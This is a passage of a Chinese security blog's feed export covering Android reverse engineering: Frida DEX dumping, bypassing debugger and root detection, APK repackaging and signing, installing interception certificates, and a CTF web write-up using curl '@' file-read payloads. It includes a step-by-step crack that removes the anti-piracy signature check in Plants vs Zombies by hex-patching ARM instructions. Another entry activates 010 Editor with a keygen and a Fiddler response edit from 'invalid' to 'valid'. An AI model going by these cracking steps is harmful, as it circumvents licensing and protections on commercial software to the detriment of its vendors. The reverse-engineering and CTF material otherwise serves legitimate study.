id="基于Frida的工具"><a href="#基于Frida的工具" class="headerlink" title="基于Frida的工具"></a>基于Frida的工具</h2><p>FRIDA-DEXDUMP<br>github地址：<a href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a><br>这个工具主要是暴力搜索内存dump dex方式。<br>对于完整的dex，采用暴力搜索dexn035即可找到。 而对于抹头的dex，通过匹配一些特征来找到，然后自动修复文件头，很强大的一个脚本工具。</p><p>Frida-Apk-Unpack<br>github地址：<br><a href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a><br><a href="https://github.com/GuoQiang1993/Frida-Apk-Unpack">https://github.com/GuoQiang1993/Frida-Apk-Unpack</a><br>上面这三个工具都是优先找到OpenMemory和OpenCommon函数，在内存中，也就是app loader以后查找dex文件头dex035，然后根据dex size偏移量把dex整个dump下来。但这个工具在android7.1以上测试由于hook opencommon(libart.so中openmemory去掉了，只能用opencommon这个入口)函数，存在无法唤醒函数情况。</p><hr><h1 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h1><h2 id="绕过调试器检测"><a href="#绕过调试器检测" class="headerlink" title="绕过调试器检测"></a>绕过调试器检测</h2><p>没有绕过反调试的通用方法：最佳方法取决于用于防止或检测调试的特定机制以及整体保护方案<br>中的其他防御措施。例如：如果没有完整性检查，或者您已经将其停用，则修补应用程序可能是<br>最简单的方法。在其他情况下，Hook 框架或内核模块可能更可取。以下方法描述了绕过调试器检<br>测的不同方法：<br>• 修补防调试功能：通过简单地用 NOP 指令覆盖它来禁用有害行为。请注意，如果防调试机制<br>设计合理，则可能需要更复杂的补丁。<br>• 使用 Frida 或 Xposed 挂钩 Java 和本机层上的 API：处理诸如 isDebuggable 和<br>isDebuggerConnected，之类的函数的返回值以隐藏调试器。<br>• 改变环境：Android 是一个开放的环境。如果没有其他效果，则可以修改操作系统，以颠覆<br>开发人员在设计反调试技巧时所做的假设</p><h2 id="绕过-Root-检查"><a href="#绕过-Root-检查" class="headerlink" title="绕过 Root 检查"></a>绕过 Root 检查</h2><p>如果采用 JDB，DDMS，strace 或内核模块来跟踪 App 并了解其运行情况。通常会看到与操作系统<br>的各种可疑交互，例如运行 su 读取并获取进程列表。这些可以交互都是设备被 root 的标志。所<br>以应当一次性识别并足证 root 检查程序的运行。如果执行黑盒安全分析，应当在第一步就令 root<br>检查程序失效。<br>要绕过这些检查，可以使用下面几种技术，其中大多数是在“逆向工程和篡改”章节中介绍过的：<br>• 重命名二进制文件。例如：简单地重命名 su 二进制文件足以对抗 root 检测（注意，请不要<br>破坏初始环境！）。<br>• 卸载/ proc 以防止读取进程列表。 但有时，这不足以绕过此类检查。<br>• 用 Frida 或 Xposed 在 Javac 层和 Native 层上进行 Hook。通过伪造应用程序的返回值，隐藏<br>文件内容和进程。<br>• 使用内核模块 Hook 低等级的 API。<br>• 篡改 app 来逃避检查。</p><p>检查 root 检测机制时，应包括以下机制：<br>• 在应用程序中采用多种不同类似的检测机制（而不是仅采用一种机制进行检测）。<br>• 让检测机制在多个层面的 API 上运行（JavaAPI、Native 函数、汇编程序、系统调用）。<br>• 检测机制应当是原创的（不应是从 StackOverflow 或其他来源复制粘贴而来）。</p><p>研究 root 检测机制绕过的方法时应回答下列问题：<br>• 是否可以使用 RootCloak 等标准工具轻松绕开检测机制？<br>• 进行 root 检测需要进行静态/动态分析吗？<br>• 需要编写自定义代码吗？<br>• 成功绕过检测机制需要多长时间？<br>• 绕过检测机制有哪些困难？<br>如果缺少 root 检测或 root 检测容易被，请根据上面列出的有效性标准提出建议。这些建议可能包<br>括更多种类的检测机制，以及将现有机制与其他防御措施更好地集成。</p><hr><h2 id="app重新打包过程"><a href="#app重新打包过程" class="headerlink" title="app重新打包过程"></a>app重新打包过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#apktool反编译</span><br><span class="line">java -jar Apktool_2.5.0.jar d zwdzjs.apk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 重新打包</span><br><span class="line">java -jar Apktool_2.5.0.jar b zwdzjs</span><br><span class="line"></span><br><span class="line"># 生成key</span><br><span class="line">keytool -genkey -alias q0o0p.keystore -keyalg RSA -validity 20000 -keystore q0o0p.keystore</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 使用上面生成的key进行签名</span><br><span class="line">jarsigner -verbose -keystore q0o0p.keystore -signedjar zwdzjs_signed.apk zwdzjs.apk q0o0p.keystore</span><br></pre></td></tr></table></figure><p> APK 签名方案可供选择。<br>• JAR 签名（v1 方案）。<br>• APK 签名方案 v2（v2 方案）。<br>• APK 签名方案 v3（v3 方案）。<br>安卓 7.0（API 级别 24）及以上版本支持的 v2 签名，与 v1 方案相比，安全性和性能都有所提<br>高。<br>安卓 9（API 级别 28）及以上版本支持的 V3 签名，使应用程序能够更改其签名密钥，作为<br>APK 更新的一部分。该功能通过允许同时使用新旧密钥，保证了兼容性和应用程序的持续可用<br>性。<br>对于每个签名方案，发行版构建应该总是通过其之前的所有方案进行签名。</p><p>首先记得去除签名，用WinRAR打开apk，找到META-INF文件夹，删除MANIFEST.MF之外的所有其他文件即可。</p><p>jarsigner方式只支持v1签名，apksigner方式支持v1和v2的方式。<br>v1和v2的区别，可以参考 <a href="https://blog.csdn.net/qq_32115439/article/details/55520012%E3%80%82">https://blog.csdn.net/qq_32115439/article/details/55520012。</a><br>方式一：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore [您的私钥存放路径] -signedjar [签名后文件存放路径] [未签名的文件路径] [您的证书名称]</span><br><span class="line">jarsigner -verbose -keystore ~/Workspace/mykeystore -signedjar ./signed.apk ./unsigned.apk xiaomi</span><br></pre></td></tr></table></figure><p>方式二：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apksigner sign --ks 密钥库名 --ks-key-alias 密钥别名 xxx.apk</span><br></pre></td></tr></table></figure><p>上述命令，签名后没有改变文件名称。如何判断是否签名成功？可以采用如下命令。</p><p>打印签名信息命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -<span class="built_in">alias</span> demo.keystore -keyalg RSA -validity 20000 -keystore demo.keystore</span><br><span class="line">keytool -list -printcert -jarfile appname.apk</span><br></pre></td></tr></table></figure><p>加固后的APP运行流程<br>APP启动 -&gt;壳dex先加载起来 -&gt;壳负责把源dex文件读出来-&gt;壳把源dex文件解密-&gt;把解密后的dex加载进内存 源dex运行起来 </p><hr><p>梆梆&amp;爱加密java反调试绕过：<br><a href="https://bbs.pediy.com/thread-259610.htm">https://bbs.pediy.com/thread-259610.htm</a><br>基于Frida的工具：<br><a href="https://yangrz.github.io/blog/2020/06/09/frida/">https://yangrz.github.io/blog/2020/06/09/frida/</a><br>Android ART虚拟机：<br><a href="https://blog.csdn.net/u011337574/article/details/81362621">https://blog.csdn.net/u011337574/article/details/81362621</a></p><hr><p>参考:<br>Frida-API:<a href="https://frida.re/docs/javascript-api/">https://frida.re/docs/javascript-api/</a><br>Frida:<br><a href="https://blog.csdn.net/freeking101/article/details/106965168?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control">https://blog.csdn.net/freeking101/article/details/106965168?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control</a></p><p><a href="https://blog.csdn.net/freeking101/article/details/106965168?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control">https://blog.csdn.net/freeking101/article/details/106965168?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control</a></p><p>Android逆向工具:<br><a href="https://blog.csdn.net/earbao/article/details/54590040?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328680.54300.16164185419388575&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/earbao/article/details/54590040?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328680.54300.16164185419388575&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p><p>Android(系统进程)安全机制:<br><a href="https://blog.csdn.net/haoxuhong/article/details/80140911">https://blog.csdn.net/haoxuhong/article/details/80140911</a></p><p>脱壳机制原理:<br><a href="https://crifan.github.io/android_app_security_crack/website/android_crack_tech/how_remove_shell_unpacking.html(%E5%A4%A7%E4%BD%AC%E5%8D%9A%E5%AE%A2)">https://crifan.github.io/android_app_security_crack/website/android_crack_tech/how_remove_shell_unpacking.html(大佬博客)</a></p><p>逆向思维:<br><a href="https://blog.csdn.net/u012551350/article/details/98871295">https://blog.csdn.net/u012551350/article/details/98871295</a></p><p>面经:<br><a href="http://smartadmin.com.cn/smartadmin/show-4913.html">http://smartadmin.com.cn/smartadmin/show-4913.html</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向基础--寄存器介绍</title>
      <link href="/2021/02/19/ida/"/>
      <url>/2021/02/19/ida/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="通用寄存器："><a href="#通用寄存器：" class="headerlink" title="通用寄存器："></a>通用寄存器：</h2><p>EAX（寄存器寄存器-累加器）：最常用于算术，逻辑和数据传输指令、乘法和除法运算使用此寄存器。对于Windows API函数，函数的返回值通常将存储在EAX寄存器中。<br>EBX（基址寄存器）：EBX寄存器可以直接访问存储器数据，它也是一个通用寄存器。<br>ECX（计数寄存器）：ECX是一个共享寄存器，可以用作各种命令的计数器。它还可能包含内存中的数据未对齐。使用计数器的命令是顺序，循环和LOOP / LOOPD指令。<br>EDX（数据寄存器）：是一个通用寄存器，用于包含乘法结果或除法结果的一部分。它还可以直接访问内存中的数据地址。<br>EDI（目标索引）：EDI通常用于处理字符串或数组的工作。该寄存器将指向目标字符串。此外它也是一个通用寄存器。<br>ESI（源索引）：与EDI一样，ESI也经常用于处理字符串或数组的操作。该寄存器将指向源字符串。<br>EBP（基本指针）：EBP指向内存位置，除了被共享外，还用作访问函数堆栈中的参数和局部变量的帧指针。<br>ESP（堆栈指针）：该寄存器始终指向当前堆栈顶部。根据堆栈的工作原理，该寄存器将被定向到低位地址。<br>因此共有8个通用的32位寄存器，即EAX(32位)，EBX，ECX，EDX，ESP，EBP，ESI和EDI。另外这些寄存器可以细分为16位和8位寄存器<br>AX(16bit)<br>AH(8bit)<br>AL(8bit)<br>如果EAX寄存器的值为0x12345678，则AX是包含最后四位数字的16位寄存器</p><table><thead><tr><th>64bit</th><th>32bit</th><th>lower 16 bit</th><th>lower 8 bit</th><th>upper 8 bit</th></tr></thead><tbody><tr><td>RAX</td><td>EAX</td><td>AX</td><td>AL</td><td>AH</td></tr><tr><td>RBX</td><td>EBX</td><td>BX</td><td>BL</td><td>BH</td></tr><tr><td>RCX</td><td>ECX</td><td>CX</td><td>CL</td><td>CH</td></tr><tr><td>RDX</td><td>EDX</td><td>DX</td><td>DL</td><td>CL</td></tr><tr><td>RSI</td><td>ESI</td><td>SI</td><td></td><td></td></tr><tr><td>RDI</td><td>EDI</td><td>DI</td><td></td><td></td></tr><tr><td>RBP</td><td>EBP</td><td>BP</td><td></td><td></td></tr><tr><td>RSP</td><td>ESP</td><td>SP</td><td></td><td></td></tr><tr><td>R8~R15</td><td>R8D</td><td>R8W</td><td>R8B</td><td></td></tr></tbody></table><hr><h2 id="plantVSzombie-去除签名校验"><a href="#plantVSzombie-去除签名校验" class="headerlink" title="plantVSzombie 去除签名校验"></a>plantVSzombie 去除签名校验</h2><p>ida -&gt;alt+t -&gt; Landroid/content/pm/Signature(java层没有so层搜索)<br>待漫长的搜索过程结束后:<br><img src="https://q0o0p.top/2021/04/19/ida/6.png"><br><img src="https://q0o0p.top/2021/04/19/ida/1.png"><br>-&gt; 双击进入IDA View-A界面 -&gt; 按F5查看该函数的伪代码(v17有多个返回值)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00DE8648                 LDR             R2, =(aSignatures - 0xDE865C) ; &quot;signatures&quot;</span><br><span class="line">.text:00DE864C                 MOV             R0, R4</span><br><span class="line">.text:00DE8650                 LDR             R3, =(aLandroidConten - 0xDE8660) ; &quot;[Landroid/content/pm/Signature;&quot;</span><br><span class="line">.text:00DE8654                 ADD             R2, PC, R2 ; &quot;signatures&quot;</span><br><span class="line">.text:00DE8658                 ADD             R3, PC, R3 ; &quot;[Landroid/content/pm/Signature;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://q0o0p.top/2021/04/19/ida/2.png"><br><img src="https://q0o0p.top/2021/04/19/ida/3.png"></p><p>-&gt; 可基本判断出该函数获取签名的hashcode之后进行了运算并返回一个值，我们推测该返回值是用于签名的比对，</p><p><img src="https://q0o0p.top/2021/04/19/ida/4.png"><br>-&gt; 那么我们回到汇编界面，到函数头看一下是否有交叉引用（ CODE XREF:代码交叉引用  ）<br> <img src="https://q0o0p.top/2021/04/19/ida/5.png"></p><p>-&gt; 果然有对该函数的引用，双击 CODE XREF: sub_DE8758+8↓p 查看调用它的函数。<br> <img src="7.png"></p><p>为便于查看逻辑，我们按空格键进入Graph View<br> <img src="https://q0o0p.top/2021/04/19/ida/8.png"><br> <img src="https://q0o0p.top/2021/04/19/ida/9.png"><br>  <img src="https://q0o0p.top/2021/04/19/ida/10.png"><br> 在跳转运行了sub_DE8758后，将返回值（R0中的值）与另一个值（R5中的值）通过CMP指令进行了比较，并通过BEQ指令根据结果进行了跳转，由此可见，相同的话，程序会继续运行，不同的话，后续会出现弹窗提示盗版信息。<br> 将该跳转修改为始终执行至loc_DE88F4的跳转，接下来我们进入逻辑修改的环节。</p><p> 分析完逻辑后，可以简单的得出两种思路，<br>思路1. CMP R0,R5   时，将对比的两者修改为同一个寄存器，即 CMP R0,R0 或 CMP R5,R5<br>思路2. BEQ loc_DE88F4  时，将BEQ修改为BNE，实现不相同则跳转<br>接下来就这两个思路进行修改和验证。</p><ol><li><p>CMP R0,R3 → CMP R0,R0<br>切换到Hex-View界面,右键Jump in a new hex window<br><img src="https://q0o0p.top/2021/04/19/ida/11.png"><br>打开ARM指令转换工具，确认CMP R0,R5及CMP R0,R0的十六进制<br>使用十六进制编辑器010Editor将so文件中的 03 00 50 E1修改为00 00 50 E1<br>即实现了CMP R0,R5 到CMP R0,R0的修改。<br>注意：因为我们起初在IDA中搜索到了3个地方使用关键字 Landroid/content/pm/Signature，</p></li><li><p>BEQ loc_508BA0 →  BNE loc_508BA0<br>05 00 50 E1-&gt; 00 00 50 E1  00DE8658 –&gt; 00DE877C<br>05 00 00 0A -&gt;1A  013E844C –&gt; 013E8570</p></li></ol><p>bne: 数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处<br>　 beq: 数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处</p><hr><p>参考:<br><a href="https://www.kanxue.com/book-24-266.htm">https://www.kanxue.com/book-24-266.htm</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>App抓包工具介绍及使用</title>
      <link href="/2021/01/27/Caught-tools/"/>
      <url>/2021/01/27/Caught-tools/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="fiddler-HttpCanary手机抓包"><a href="#fiddler-HttpCanary手机抓包" class="headerlink" title="fiddler, HttpCanary手机抓包"></a>fiddler, HttpCanary手机抓包</h2><h3 id="抓包环境"><a href="#抓包环境" class="headerlink" title="抓包环境"></a>抓包环境</h3><ul><li>手机和电脑在同一WiFi下</li><li>抓包软件的CA证书必须导入手机（最好在系统证书目录下）</li></ul><p>1、进入路径/data/data/com.guoshi.httpcanary.premium/cache<br>找到httpcanary.pem导出到电脑</p><p>2、通过openssl计算证书hash值<br>//.cer格式证书<br>openssl x509 -inform DER -subject_hash_old -in &lt;证书文件.cer&gt;<br>//.pem格式证书<br>openssl x509 -inform PEM -subject_hash_old -in  &lt;证书文件.pem&gt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS D:\download\OpenSSL-Win64\bin&gt; .\openssl.exe</span><br><span class="line">OpenSSL&gt; x509 -inform DER -subject_hash_old -<span class="keyword">in</span> D:\download\OpenSSL-Win64\bin\FiddlerRoot.cer</span><br><span class="line"></span><br><span class="line">PS D:\download\OpenSSL-Win64\bin&gt; .\openssl.exe  x509 -inform DER -text -<span class="keyword">in</span> D:\download\OpenSSL-Win64\bin\FiddlerRoot.cer &gt; 269953fb.0</span><br></pre></td></tr></table></figure><p>3、生成系统系统预设格式证书文件（记得加上”.0”<br>//cer格式<br>openssl x509 -inform DER -text -in xxx.cer &gt; hash值.0<br>//pem格式<br>openssl x509 -inform PEM -text -in xxx.pem &gt; hash值.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">D:\download\OpenSSL-Win64\bin&gt;  .\openssl.exe x509 -inform PEM -subject_hash_old -<span class="keyword">in</span> D:\download\OpenSSL-Win64\bin\HttpCanary.pem</span><br><span class="line"></span><br><span class="line">87bc3517</span><br><span class="line"></span><br><span class="line">PS D:\download\OpenSSL-Win64\bin&gt;  .\openssl.exe  x509 -inform PEM -text -<span class="keyword">in</span> D:\download\OpenSSL-Win64\bin\HttpCanary.pem &gt; 87bc3517.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4、上传证书文件xxxxx.0到手机/system/etc/security/cacerts路径下<br>在/data/data/com.guoshi.httpcanary/cache/HttpCanary.pem<br>复制一份并改名为HttpCanary.jks</p><p>5、给证书权限<br>chmod 644 /system/etc/security/cacerts/5d7ca55f.0</p><p>执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell <span class="string">&quot;su -c &#x27;mount -o rw,remount /system;cp /storage/emulated/0/MT2/apks/87bc3517.0 /storage/emulated/0/MT2/apks/269953fb.0 /system/etc/security/cacerts;chmod 644 /system/etc/security/cacerts/87bc3517.0 /system/etc/security/cacerts/269953fb.0;&#x27;&quot;</span>  </span><br></pre></td></tr></table></figure><p><code>注意：由于Android11的限制，低版本可用</code><br>使用命令提示: <img src="https://q0o0p.top/2021/01/27/Caught-tools/1.png"><br>PS C:\Users\wow&gt; adb shell “su -c ‘mount -o rw,remount /system;cp /storage/emulated/0/MT2/apks/87bc3517.0 /storage/emulated/0/MT2/apks/269953fb.0 /system/etc/security/cacerts;chmod 644 /system/etc/security/cacerts/87bc3517.0 /system/etc/security/cacerts/269953fb.0;’”<br>mount: ‘/system’ not in /proc/mounts</p><p>!！！这是假root？<br>还是另寻他法 -&gt; magisk<br>通过Magisk来挂载文件到system分区，把要修改的文件放入模块，然后刷入即可。比如: 要安装根证书，根证书的文件路径为/system/etc/security/cacerts/，那我们就要一层一层分别建立名为etc、security、cacerts的文件夹，然后将根证书文件放入cacerts文件夹中，最后到Magisk里刷入模块</p><p>有一个现成的模块可以使用 -&gt; Move Certificates模块<br>安装完模块之后，用户分区的所有证书默认会导入到系统分区。<br><img src="https://q0o0p.top/2021/01/27/Caught-tools/2.png"></p><p><code>注意：安卓10采用了某些安全策略，将系统分区/system挂载为只读，root了也没用，无法写入系统分区也就无法导入系统证书，在使用fiddler抓包分析的时候，很多app只认系统证书，不认用户证书。唯一的方法是魔改安卓10的rom，或者使用magisk的模块magisk的Move Certificates模块。</code></p><hr><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p>Burp 套件是一个用于对移动端和 web 应用程序进行安全测试的集成平台。其上的工具通过无缝<br>协同工作以支持整个测试过程，从攻击面的初始映射和分析到发现和利用安全漏洞。Burp 代理作<br>为 Burp 套件的 web 代理服务器运行，Burp 套件位于浏览器和 web 服务器之间。套件允许您拦<br>截、检查和修改传入和传出的原始 HTTP 流量。<br>当 iOS 设备和工作站连接到允许客户端到客户端通信的 Wi-Fi 网络时设置 Burp 代理流量是非常简<br>单的。<br>PortSwigger 提供了一个很好的关于设置 Android 设备以使用 Burp 的教程，以及一个关于将 Burp<br>的 CA 证书安装到 Android 设备的教程。<br>burpsuite手机抓包配置</p><h2 id="Xposed-XServer抓取加密包"><a href="#Xposed-XServer抓取加密包" class="headerlink" title="Xposed+XServer抓取加密包"></a>Xposed+XServer抓取加密包</h2><p>工具链接:<br><a href="https://github.com/monkeylord/XServer">https://github.com/monkeylord/XServer</a></p><p>常用抓包软件的区别：<br>Burpsuite和Fiddler在抓包上侧重请求和响应的数据，Wireshark侧重于数据帧 </p><hr><p>360加固脱壳分析:<br><a href="https://bbs.pediy.com/thread-263220.htm">https://bbs.pediy.com/thread-263220.htm</a><br>Hyperpwn:基于gdb的调试利器:<br><a href="https://www.52pojie.cn/thread-1093821-1-5.html">https://www.52pojie.cn/thread-1093821-1-5.html</a><br>Xposed+XServer无需脱壳抓取加密包<br><a href="https://xz.aliyun.com/t/7669">https://xz.aliyun.com/t/7669</a><br>Xposed 插件开发<br><a href="https://blog.csdn.net/ausboyue/article/details/89950463">https://blog.csdn.net/ausboyue/article/details/89950463</a></p><p><a href="https://blog.csdn.net/u011195398/article/details/86680658?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-8&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/u011195398/article/details/86680658?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-8&amp;spm=1001.2101.3001.4242</a></p><p><a href="https://blog.csdn.net/u013496707/article/details/50945639?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/u013496707/article/details/50945639?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a><br>Cydiasubstrate:<br><a href="http://www.cydiasubstrate.com/id/264d6581-a762-4343-9605-729ef12ff0af/">http://www.cydiasubstrate.com/id/264d6581-a762-4343-9605-729ef12ff0af/</a></p><p>Cydiasubstrate modules 的java开发:<br><a href="https://blog.csdn.net/Xbalien29/article/details/22661479?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328741.49458.16170913173692643&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/Xbalien29/article/details/22661479?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328741.49458.16170913173692643&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向学习之旅——（010 editor注册）</title>
      <link href="/2021/01/07/reverse/"/>
      <url>/2021/01/07/reverse/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="010-editor"><a href="#010-editor" class="headerlink" title="010 editor"></a>010 editor</h2><p>找破解版当心病毒？学生能力有限？（有能力请支持正版激活码）<br>下面两分钟搞定010 editor激活 o(n_n)o ~~<br>使用大佬几年前的注册机+fiddler，在也不用当心激活码找不到，老弹出激活界面了…</p><h3 id="010EditorKeygen注册机地址"><a href="#010EditorKeygen注册机地址" class="headerlink" title="010EditorKeygen注册机地址"></a>010EditorKeygen注册机地址</h3><p><a href="https://github.com/HMBSbige/010EditorKeygen">https://github.com/HMBSbige/010EditorKeygen</a></p><p>参考某大佬的评论，fiddler抓包，两分钟搞定，无需手动搭建web<br><a href="https://www.52pojie.cn/thread-1381376-1-1.html">https://www.52pojie.cn/thread-1381376-1-1.html</a><br>打开下载好的注册机，用户名随意，copy激活码，past到010注册码界面，先不验证…（纯小白都能看懂的教程）</p><h3 id="Fiddler抓包步骤："><a href="#Fiddler抓包步骤：" class="headerlink" title="Fiddler抓包步骤："></a>Fiddler抓包步骤：</h3><p>Rules -&gt; After Responses -&gt; 010 editor点击验证 -&gt; Fiddler 界面点击抓到的http包信息 -&gt; 找到invalid 将其改为valid -&gt; 点击发送（验证结果发给客户端）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web进阶题</title>
      <link href="/2020/12/05/CTF-Web/"/>
      <url>/2020/12/05/CTF-Web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先输入几个域名进行测试:<br><code>127.0.0.1</code><br>输入的ip被执行了ping命令并返回，是一个命令执行的功能。<br><img src="1.png"><br>在url中输入 <code>127.0.0.1| ls</code>   回显 invalid URL<br>推测不是管道命令<br><img src="2.png"><br>传递个%79发现传递之后变成了?url=w ,当url=()&gt;=%80时,出现报错(Django使用的是gbk编码，超过%F7的编码不在gbk中有意义，所以%80会报错)<br><code>http://220.249.52.133:42595/index.php?url=%80</code><br><img src="3.png"><br>错误信息中可以看到后台使用python,并且使用了Django框架…</p><p>根据Django的目录，使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。<br>结合django的报错得知了项目的绝对路径为/opt/api<br>?url=@/opt/api/api/settings.py<br>报错内容搜索database可以得到：<br><img src="4.png"><br>输入?url=@/opt/api/database.sqlite3<br>搜索ctf得到flag.<br><img src="6.png"></p><p>Django使用的是gbk编码，超过%F7的编码不在gbk中有意义，所以%80会报错<br>当 CURLOPT_SAFE_UPLOAD 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。</p><h2 id="知识点扩展"><a href="#知识点扩展" class="headerlink" title="知识点扩展"></a>知识点扩展</h2><h3 id="curl-扩展"><a href="#curl-扩展" class="headerlink" title="curl 扩展"></a>curl 扩展</h3><p>（1）远程内存读取（CVE-2018-16890）</p><p>利用此漏洞，攻击者可以在服务器上远程获取客户端内存至多64KB的原始内存信息。而且因为连接可以多次进行，服务器理论上可以多次重复地获取客户端内存。</p><p>（2）远程栈缓冲区溢出（CVE-2019-3822）</p><p>利用此漏洞，攻击者可以通过服务器的认证消息对客户端进行远程栈缓冲区溢出。通过组合上一个漏洞，理论上攻击者可以对客户端进行远程代码执行（RCE）。</p><h3 id="python-Django框架扩展"><a href="#python-Django框架扩展" class="headerlink" title="python Django框架扩展"></a>python Django框架扩展</h3><p>django project  框架目录结构<br>|my_project             //项目名 后期可修改建议不修改<br>|— <strong>init</strong>.py        //python项目必带  模块化思想<br>|— settings.py        //项目的总配置文件  里面包含数据库 web应用 时间等各种配置<br>|— urls.py            //URL配置文件  Django项目中所有地址中（页面）都需要我们自己去配置其URL<br>|— wsgi.py            //python服务器网关接口<br>|manage.py              //django项目管理文件 与项目进行交互的命令行工具集的入口<br>|————————————————————————</p><p>django 应用目录结构<br>project1<br>|– migrations                         //数据移植（迁移）模块<br>|——- <strong>init</strong>.py<br>|– <strong>init</strong>.py<br>|– admin.py                            //该应用后台管理系统配置<br>|– apps.py                             //该应用的一些配置 1.9以后自动生成<br>|– models.py                           //数据模块<br>|– tests.py         